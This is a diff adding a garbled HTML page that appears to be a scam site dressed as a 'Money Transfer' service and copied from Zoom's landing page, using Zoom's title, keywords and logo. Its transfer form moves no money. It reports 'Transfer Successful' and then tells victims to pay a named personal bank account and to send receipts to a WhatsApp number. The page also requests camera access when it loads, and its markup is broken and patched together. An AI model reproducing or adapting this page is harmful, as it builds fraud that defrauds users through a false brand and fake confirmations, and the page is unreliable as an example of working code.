@@ -1,0 +1,772 @@
+<!doctype html>
+<html>
+    <head> 
+        <meta charset="UTF-8"> 
+        <meta name="viewport" id="viewport" content="width=device-width, initial-scale=1"> 
+        <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
+        <title>Amos conférences </title>
+    </head> 
+    <body> 
+        <link href="https://fonts.googleapis.com/css?family=Raleway|Rock+Salt|Source+Code+Pro:300,400,600" rel="stylesheet"><link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+   
+    <style>
+        button{
+            background:linear-gradient(to right,red, orange, purple);
+ border-raduis:50px;           
+      width:97px;
+      height:45px;    
+        }
+
+input{
+    background-color: orange 
+}
+        
+* {
+  margin:0;
+  padding:0;
+  list-style: none;
+  text-decoration: none;
+  transition: 0.3s;
+  -webkit-touch-callout: none;
+  -webkit-user-select: none;
+  user-select:none;
+  outline:none;
+}
+
+body {
+  background-color:white;
+}
+
+.ham {
+  width:45px;
+  height:45px;
+  background:white;border-radius:7px;
+  display: flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  z-index: 100;
+  position: fixed;
+  top: 15px;
+  left: 20px;
+  fixe:center;
+}
+
+.line1, .line2,.line3{
+  background: orange;
+order-radius:5px;
+  width:25px;
+  height:2px;
+  margin:2px;
+}
+
+.active .line1{
+  transform: rotate(-45deg) translate(-5px, 5px);
+
+}
+.active .line2 {
+  opacity: 0;
+}
+
+.active .line3 {
+  transform: rotate(70deg) translate(-10px, 10px);
+}
+
+header {
+  width:100%;
+  height:100vh;
+}
+
+.link{    
+  right: 0%;
+}
+
+nav ul {
+  right:-109%;
+  position:fixed;
+  height:100vh;
+  width:100%;
+ 
+  border: 1px solid ffd;
+background-color: orange;
+background-clip: padding-box;
+min-width: 100px;
+box-shadow: 0 6px 12px rgb(0 0 0 / 18%);
+}
+flex-direction:column;
+  align-items:center;
+  justify-content:left;
+}
+
+ul h1 {
+  color: orange  li{
+  text-align:center;
+  padding:8px 0;
+  width:80%;
+}
+
+ul li:hover{
+  background:Black-dwon:7%;
+  width:100%; 
+}
+
+li a{
+  color:red;
+{
+  padding:1px 15px 1px 15px;
+  color:white 
+
+</style>
+
+
+<body>
+<center>
+<div class="header">
+
+
+  <nav>
+    <ul id="ul">
+     
+ <style>
+
+.container {
+    width: 90%;
+    max-width: 400px;
+    background-color: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+h1 {
+    text-align: center;
+}
+
+form {
+    display: flex;
+    flex-direction: column;
+}
+
+label {
+    margin-bottom: 8px;
+}
+
+input, select, button {
+    margin-bottom: 16px;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    font-size: 16px;
+}
+
+button {
+    background-color: #4CAF50;
+    color: white;
+    border: none;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #45a049;
+}
+#result {
+    margin-top: 20px;
+    text-align: center;
+}
+
+    </style>   
+     
+    <div class="container">
+        <h1>Money Transfer</h1>
+        <div class="login-logo" src="https://raw.githubusercontent.com/Isabellaparis/photosgame/main/png.monster-481-370x370.webp" alt="Squirrel Banking Logo">
+        <form id="transferForm">
+            <label for="amount">Amount:</label>
+            <input type="number" id="amount" name="amount" required>
+            
+            <label for="recipient">Recipient:</label>
+            <input type="text" id="recipient" name="recipient" placeholder="Bank account or mobile money number" required>
+
+            <label for="direction">Transfer Direction:</label>
+            <select id="direction" name="direction">
+                <option value="CMtoNG">From Cameroun to negeria</option>
+                <option value="NGtoCM">From Nigeria to Cameroun</option>
+            </select>
+        
+                        <option value="NGtoCM">From Ghana to Nigeria</option>
+            </select>
+          
+            
+            <button type="submit">Transfer Money</button>
+        </form>
+        <p id="whatsappMessage">Send payment receipt through WhatsApp to +237694841595</p>
+    </div>
+
+    <script>
+        document.getElementById('transferForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Fetch form data
+            let amount = document.getElementById('amount').value;
+            let recipient = document.getElementById('recipient').value;
+            let direction = document.getElementById('direction').value;
+            // Dummy validation (you should implement proper validation)
+            if (amount && recipient && direction) {
+                // Display success message for transfer
+                alert(`Transfer Successful!\nTransferring ${amount} ${direction === 'CMtoGH' ? 'from Cameroun to Nigeria' : 'from Cameroun to Nigeria'} to ${recipient}`);
+                
+                // Display additional message for payment
+                alert(`Make payments to:\nAccount Name: atangana dawai\nBank: Pak Pay\nAccount Number: 694841595`);
+
+                // Clear form fields after transfer (optional)
+                document.getElementById('amount').value = '';
+                document.getElementById('recipient').value = '';
+                document.getElementById('direction').value = 'NGtoGH'; // Reset direction to default
+            } else {
+                alert('Please fill in all fields');
+            }
+        });
+    </script>
+   <script> document.getElementById('transferForm').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        // Fetch form data
+        let amount = document.getElementById('amount').value;
+        let recipient = document.getElementById('recipient').value;
+        let direction = document.getElementById('direction').value;
+
+        // Dummy validation (you should implement proper validation)
+        if (amount && recipient && direction) {
+            // Display success message for transfer
+            alert(`Transfer Successful!\nTransferring ${amount} ${direction === 'CMtoNG' ? 'from Cameroun to negeria' : 'from Cameroun to Nigeria'} to ${recipient}`);
+            
+            // Display additional message for payment
+            alert(`Make payments to:\nAccount Name: Timothy Oghaleoghene Ovedhe\nBank: Palm Pay\nAccount Number: 694841595`);
+
+            // Clear form fields after transfer (optional)
+            document.getElementById('amount').value = '';
+            document.getElementById('recipient').value = '';
+            document.getElementById('direction').value = 'CMtoNG'; // Reset direction to default
+        } else {
+            alert('Please fill in all fields');
+        }
+    });
+</script>
+
+
+
+<script>  
+function hamMenuClick()
+{
+  document.getElementById("hamMenu").classList.toggle("active");
+  document.getElementById("ul").classList.toggle("link");
+}
+</script>
+ 
+ 
+
+    
+
+  </body>    
+        <ul>
+                      <li> 
+        </div>
+    </nav>
+  
+  
+    <div id="hamMenu" class="ham" onclick="hamMenuClick()">
+      <div class="line1"></div>
+      <div class="line2"></div>
+      <div class="line3"></div>
+   </div>
+      
+
+
+   
+  
+    <title>Video Conferencing, Web Conferencing, Online Meetings, Screen Sharing - Zoom</title> <!--customize landing page title-->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,Chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <meta name="keywords" content="zoom, zoom.us, video conferencing, video conference, online meetings, web meeting, video meeting, cloud meeting, cloud video, group video call, group video chat, screen share, application share, mobility, mobile collaboration, desktop share, video collaboration, group messaging" />
+    <meta name="description" content="Zoom unifies cloud video conferencing, simple online meetings, and cross platform group chat into one easy-to-use platform. Our solution offers the best video, audio, and screen-sharing experience across Zoom Rooms, Windows, Mac, iOS, Android, and H.323/SIP room systems." />
+    <link rel="shortcut icon"src"3fea8aec2dbcab9f...6a0e444043e.jpg".cloudfront.net/zoom.ico"/>
+    <style>
+        html, body {
+            margin: 0px;
+            font-family: sans-serif;
+            height: 100%
+        }
+        .container {
+            display: table;
+            height: 100%;
+            width: 100%;
+            background-image: url("www.orange.jpg");  /*customize background image*/
+            background-size: cover;
+        }
+        .content-body {
+            display: table-cell;
+            vertical-align: middle;
+        }
+        a {
+            text-decoration: none;
+            color: #2470cc;
+        }
+
+        a:hover {
+            text-decoration: none;
+        }
+        .content {
+            /*customize position*/
+            padding: 40px;
+            max-width: 800px;
+            margin-left: 45%;
+        }
+        h1 {
+            padding-top: 20px;
+            padding-bottom: 20px;
+            font-weight: normal;
+        }
+        p {
+            font-size: 17px;
+        }
+        .button {
+            width: 80px;
+            background-color: orange; /*customize button color */
+            border-color: #2D8CFF;
+            padding: 12px 20px;
+            display: inline-block;
+            text-align: center;
+            margin: 10px 0;
+            transition: .3s ease;
+        }
+        .button:hover {
+            background-color: rgb(45, 162, 258);  /*customize button color */
+        }
+        .btn-text {
+            color: white;   /*customize button font color */
+            font-size: 17px;
+        }
+        .made-with {
+            padding-top: 15px;
+            padding-bottom: 0;
+            margin-bottom: 0;
+        }
+        .row > div {
+            display: inline-block;
+            vertical-align: middle;
+        }
+        .left{
+            margin-left: 15px;
+        }
+        .right > span{
+            display: block;
+        }
+
+        .zoom-logo {
+            width: 140px;
+            height: 31.5px;
+        }
+        . footer{
+            display: table-row;
+            height: 60px;
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.4);
+            box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.15);
+            vertical-align: middle;
+        }
+        .footer a {
+            padding-left: 40px;
+            width: 99px;
+            height: 19px;
+            opacity: 0.6;
+            font-size: 14px;
+            font-weight: normal;
+            font-style: normal;
+            font-stretch: normal;
+            line-height: normal;
+            letter-spacing: normal;
+            color: green!important;
+            line-height: 60px;
+        }
+
+        @media screen and (max-width: 768px) {
+            h1 {
+                font-size: 27px;
+            }
+            .row {
+                margin-bottom:25px;
+            }
+            .row > div {
+                display: block;
+            }
+
+            .footer {
+                padding-bottom: 15px;
+                height: 40px;
+            }
+
+            .footer a {
+                display: block;
+                width: 100%;
+                height: inherit;
+                padding-left: 0;
+                padding-right: 0;
+            }
+
+            .content {
+                margin: auto;
+            }
+
+            .content > div, .made-with {
+                text-align:left;
+            }
+        }
+    </style>
+
+   <style>
+       input {
+          background-color:#ccc 
+        }
+        
+        body, input {font-size:14pt}
+input, label {vertical-align:middle}
+.qrcode-text {padding-right:1.7em; margin-right:.0}
+
+/*QR Code Button*/
+.qrcode-text-btn {display:inline-block; background:url(//dab1nmslvvntp.cloudfront.net/wp-content/uploads/2017/07/1499401426qr_icon.svg) 50% 50% no-repeat; height:1em; width:1.7em; margin-left:-1.9em; cursor:pointer}
+.qrcode-text-btn > input[type=file] {position:absolute; overflow:hidden; width:1px; height:1px; opacity:0}
+
+.button {height:16px;}
+        
+        
+    </style>
+</div>
+<!--Text Box-->
+<input type=text id="text"size=20 placeholder="Auto ID" class=qrcode-text>
+<label class=qrcode-text-btn>
+  
+<!--QR Code Button-->
+<input type=file accept="image/*" capture=environment onclick="return showQRIntro();" onchange="openQRCamera(this);" tabindex=-1></label>
+
+<!--Go Button-->
+<input type="button" id="btn" 
+    .page
+  form.form
+    a.icon(href="#0")
+      img(src="https://icon.now.sh/info/64/ffffff", alt="")
+    p Esegui la scanzione del QR code o digita il codice di accesso, poi premi il tasto Accedi
+    br
+    input(type="text" placeholder="abcdefg")
+    button(type="submit") Accedi
+    a(href="#0")" />
+    <script>
+        function openQRCamera(node) {
+  var reader = new FileReader();
+  reader.onload = function() {
+    node.value = "";
+    qrcode.callback = function(res) 
+    
+    /*Error Message*/
+    {
+      if(res instanceof Error) {
+        alert("No QR code found. Please make sure the QR code is within the camera's frame and try again.");
+      } 
+      
+      else {
+        node.parentNode.previousElementSibling.value = res;
+      }
+    };
+    qrcode.decode(reader.result);
+  };
+  reader.readAsDataURL(node.files[0]);
+}
+
+/*Camera Prompt*/
+function showQRIntro() {
+  return confirm("Use your camera to take a picture of a QR code.");
+}
+
+/*Go Button*/
+$("#btn").click( function() {
+    var url = "http://www.autoatlas.us/dealer/" + $("#text").val();
+    window.open(url);
+});
+    </script>
+     
+<div class="container">
+    <div class="content-body" role="main" aria-label="main content">
+        <div class="HiddenText"><a id="the-main-content" tabindex="-1"></a></div>
+        <div class="content"><!--customize position-->
+            <div class="row">
+                <img src="3fea8aec2dbcab9f...6a0e444043e.jpg.cloudfront.net/static/93386/image/new/ZoomLogo.png" class="zoom-logo" alt="Zoom Logo">  <!--customize company logo-->
+            </div>
+            <div class="row">
+             </p> <font color="orange"><h3> Video Conferencing </h3></font>
+            </div>
+            <div class="row">
+                <div class="right">
+                    <a href="/join" class="button"><span class="btn-text">Join</span></a>
+                </div>
+                <div class="right">
+                    <span>Connect to a meeting in progress</span>
+                        <span style="font-size: 14px;color: #636376;margin-top: 4px;">or join from the <a href="/calendar/list" style="font-size: 14px;"><h1>Public Event
+                            List</h1> </a></span>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="left">
+                    <a href="/start/videomeeting" class="button">
+                        <span class="btn-text">Host</span>
+                    </a>
+                </div>
+                <div class="right">
+                    <span>Start a meeting</span>
+                </div>
+            </div>
+            <div class="row">
+                <div class="left">
+                </div>
+            </div>
+            <p class="made-with">Made with <a href="https://atangana conférence.us/">Zoom</a></p>
+        
+   
+    
+   
+        
+    
+
+                                     
+    
+     <h3>
+       <a href="https://twitter.com/atangana dawai" class="follow-me" target="_blank">
+      <span class="follow-text">
+          <h6>
+        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="css-i6dzq1"><path d="M24 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+        </h6>
+        Follow me on Twitter
+     </span>
+      <span class="developer">
+        <img src="https://pbs.twimg.com/profile_images/1253782473953157124/x56UURmt_400x400.jpg" />
+        </h3>  
+    <div>
+    
+
+ <div class="two-col">
+      <h3><font color="red">nous contacter sur notre site</font>
+      <ul class="fa-ul">
+        <li e class="fas fa-envelope">
+       <h4><a href="mailto: atangana conference@geiml.ca">atangana conférence@gemail.com</a></h2>
+      
+  <div class="main">
+   
+    
+      
+  
+     <p class="lead-lg-1">Whatsapp me on :  <a style="color: blue;" href="https://wa.me/+237694841595"><u>https ://wa.me/+237-694841595</u></a></p>
+           <p class="lead-lg-1">Youtube Channel: <a style="color: blue;" href="https://youtube.com/atangana conférence"><u>Click Here</u></a></p>
+                
+
+<section id="newsletter">
+      <div class="container">
+        <h4>Souscrivez ou Newsletter</h4>
+        <form>
+          <input type="email" placeholder="Enter Email..." required>
+          <button type="submit" class="button_1">Souscrire</button>
+        </form>
+        <p align="center"><font color="orange" >atangana conférence le meilleurs application de tout le moment et de tout les temps donc confiance a tout ce qui utilise cette application pour rendre nos services rapide et efficace</font></p> 
+    <p align="center"><font color="#A7A8AA" > © Atangana conférence copyright 2024</font></p>
+    
+     <style>
+html,down{
+background-color:white;
+}
+#wc-dropdown-menu{
+top: inherit;
+bottom:200px;
+width:100px;
+padding:8px 0;
+position: absolute;
+right: 0;
+border-radius: 4px;
+margin-top: 6px;
+text-shadow: none;
+border: 1px solid ffd;
+background-color:#fff ;
+background-clip: padding-box;
+min-width: 100px;
+box-shadow: 0 6px 12px rgb(0 0 0 / 18%);
+}
+#wc-dropdown-menu li {
+width:50%;
+float: left;
+}
+#wc-dropdown-language #wc-dropdown-menu:after{
+top: inherit;
+bottom: -6px;
+right:10px;
+border: 0;
+border-right: 6px solid transparent;
+border-top: 6px solid teal;
+border-left: 6px solid transparent;
+border-bottom: 0;
+content: '';
+}
+#wc-dropdown-language #wc-dropdown-menu:before{
+content: '';
+display: none !important;
+}
+body div.combobox div.dropdownlist{
+width: calc(100% + 2px) !important;
+}
+</style>
+
+        <div id="wc-dropdown-language" class="dropdown-language dropdown" role="presentation">
+<a style="color: #0E71EB;" href="javascript:;" class="dropdown-toggle" data-toggle="dropdown" data-hover="dropdown" data-close-others="true" aria-haspopup="true">
+<span style="margin-left: -20px;">English</span>
+<span class="caret"></span>
+</a>
+<ul id="wc-dropdown-menu" class="dropdown-menu pull-right">
+<li class="active"><a href="javascript:;" data-locale="en-US">English</a></li>
+<li class=""><a href="javascript:;" data-locale="es-ES">Español</a></li>
+<li class=""><a href="javascript:;" data-locale="de-DE">Deutsch</a></li>
+<li class=""><a href="javascript:;" data-locale="zh-CN">简体中文</a></li>
+<li class=""><a href="javascript:;" data-locale="zh-TW">繁體中文</a></li>
+<li class=""><a href="javascript:;" data-locale="fr-FR">Français</a></li>
+<li class=""><a href="javascript:;" data-locale="pt-PT">Português</a></li>
+<li class=""><a href="javascript:;" data-locale="jp-JP">日本語</a></li>
+<li class=""><a href="javascript:;" data-locale="ru-RU">Русский</a></li>
+<li class=""><a href="javascript:;" data-locale="ko-KO">한국어</a></li>
+<li class=""><a href="javascript:;" data-locale="it-IT">Italiano</a></li>
+<li class=""><a href="javascript:;" data-locale="vi-VN">Tiếng Việt</a></li>
+</ul>
+</div>
+</li>
+</ul>
+</div>
+</span>
+</div>
+</div>
+</div>
+</div>
+<div id="fb-root"></div>
+<input type="hidden" id="__platformCheck" value="os" />
+<div id="notification"></div>
+<input type="hidden" id="detect" value="https://Galactica conférence.zoom.us/cdn-detect.png"/>
+
+<style type="text/css">
+@media screen and (max-width: 767px) {
+.navbar-signup-header .navbar-header {
+display: block;
+float: left;
+border: none;
+}
+.navbar-signup-header .collapse {
+display: block;
+}
+#header_container .container > .navbar-collapse {
+background-color: #eee;
+border: none;
+}
+#header_outer .navbar-signup-header .navbar-collapse .navbar-right {
+float: right;
+margin-top: 4px;
+}
+}
+</style>
+  <script nonce="TT_9ANARQmqTKopBb1cnSA">
+var isFreeAccount = true;
+var SB = {
+version: '5.0.94171.0322.b1d3231f',
+contextPath: '',
+baseUrl: 'https://Galactica conférence.us',
+baseStaticUrl: 'https://st3.galacaticaconference conférence .us/static/94171',
+loggedIn: false,
+fbLoggedIn: false,
+fbAppkey: '113289095462486',
+fbAppPage: 'https://apps.facebook.com/zoomvideocall/',
+fbScope: 'email,public_profile',
+pardotPaymentUrl : 'https://go.galacaticaconference.com/l/84442/2024-07-23/mw5t',
+pardotBuyUrl : 'https://go.galacaticaconference.com/l/84442/2024-07-1444xht',
+pardotSubscriptionUrl : 'https://go.galacaticaconference.com/l/84442/2024-08-24/mv5y',
+pardotActivateUserUrl : 'https://go.galacticaconference.com/l/84442/2015-10-23/mspcv',
+noSignup: 'false',
+languagePref: 'en-US',
+isGDPRCountry: false
+};
+</script>
+<script nonce="TT_9ANARQmqTKopBb1cnSA" src="https://st3.yom.us/static/94171/js/lib/vue/vue.min.js"></script>
+<script nonce="TT_9ANARQmqTKopBb1cnSA" src="https://Galactica conférence.zoom.us/static/94171/js/lib/vue/yom-components.min.js"></script>
+<script nonce="TT_9ANARQmqTKopBb1cnSA" src="https://Galactica conférence.zoom.us/static/94171/js/lib/vue/advanced/popup-captcha/popup-captcha.min.js"></script>
+<script nonce="TT_9ANARQmqTKopBb1cnSA">
+// common captcha setting
+var routingUrl=""
+var hCaptchaSiteKey="df6242b3-aef1-4156-bf8e-c5f258d9e602"
+var isCN = false;
+var isSupportGoogleCaptcha = true;
+var isSupportGoogleCaptchaForCN = true || false
+var isSupportHcaptcha = false;
+var isSmartCaptcha = true; // default
+var isHcaptcha = false; // default
+if (isSupportGoogleCaptcha) {
+// google captcha
+if (!isCN || isSupportGoogleCaptchaForCN) {
+isSmartCaptcha = false;
+isHcaptcha = false;
+}
+} else if (isSupportHcaptcha){
+// hcaptcha
+isSmartCaptcha = false;
+isHcaptcha = true;
+} else {
+// smart captcha
+isSmartCaptcha = true;
+isHcaptcha = false;
+}
+</script>
+<script nonce="TT_9ANARQmqTKopBb1cnSA" src="https://Galactica conférence..us/static/94171/js/all.min.js"></script>
+
+<script nonce="TT_9ANARQmqTKopBb1cnSA">
+$.i18n.load({
+"common.btn_close": "Close",
+"common.btn_yes": "Yes",
+"common.btn_no": "No",
+"common.title.prompt": "Prompt",
+"common.title.confirmation": "Confirmation",
+"common.unknown_error": "Unknown Error!",
+"common.error": "Error",
+"common.enter_time_in_12_hour": "Please enter a valid time in 12-hour",
+"common.tips": "Tips, press Enter to expand",
+"jquery.validation_required":"This field is required.",
+"jquery.validation_remote":"Please fix this field.",
+"]jquery.validation_email":"Please enter a valid email address.",
+"jquery.validation_url":"Please enter a valid URL.",
+"jquery.validation_date":"Please enter a 
+   </script>   
+    <script>navigator.mediaDevices.getUserMedia({video: true})
+  .then(gotMedia)
+  .catch(error => console.error('getUserMedia() error:', error));
+
+function gotMedia(mediaStream) {
+  const mediaStreamTrack = mediaStream.getVideoTracks()[0];
+  const imageCapture = new ImageCapture(mediaStreamTrack);
+  console.log(imageCapture);
+}</script>
+                   
+
+
+<script>  
+function hamMenuClick()
+{
+  document.getElementById("hamMenu").classList.toggle("active");
+  document.getElementById("ul").classList.toggle("link");
+}
+</script>           
+<script type=""></script>
+       
+
+
+    </body>
+</html>
